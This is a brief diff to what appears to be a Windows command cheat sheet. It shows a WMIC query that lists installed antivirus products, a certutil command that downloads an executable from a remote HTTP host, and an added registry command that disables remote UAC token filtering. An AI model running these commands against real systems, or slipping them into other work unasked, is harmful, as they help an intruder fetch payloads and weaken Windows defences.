@@ -212,3 +212,6 @@ WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get
 
 #download file with certutil
 certutil -urlcache -split -f “http://192.168.0.13:9999/executable.exe” executable.exe
+
+# Invalid handle error on windows login
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
